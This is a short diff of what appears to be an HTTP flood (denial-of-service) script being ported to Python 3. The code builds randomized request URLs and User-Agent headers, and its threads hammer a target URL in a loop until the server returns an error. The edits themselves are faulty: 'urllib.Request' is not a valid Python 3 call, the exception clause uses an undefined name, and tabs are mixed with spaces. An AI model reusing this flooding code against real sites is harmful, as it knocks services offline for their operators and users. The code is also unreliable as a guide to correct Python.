@@ -161,7 +161,7 @@ def httpcall(url):
 
 		param_joiner="?"
 
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 
 	request.add_header('User-Agent', random.choice(headers_useragents))
 
@@ -211,22 +211,21 @@ def httpcall(url):
 
 class HTTPThread(threading.Thread):
 
-	def run(self):
+    def run(self):
 
-		try:
+        try:
 
-			while flag<2:
+            while flag < 2:
 
-				code=httpcall(url)
+                code = httpcall(url)
 
-				if (code==500) & (safe==1):
+                if code == 500 and safe == 1:
 
-					set_flag(2)
+                    set_flag(2)
 
-		except (Exception, ex):
+        except (Exception, e):
 
-			pass
-
+            print(f"Error occurred: {e}")
 
 # monitors http threads and counts requests
 
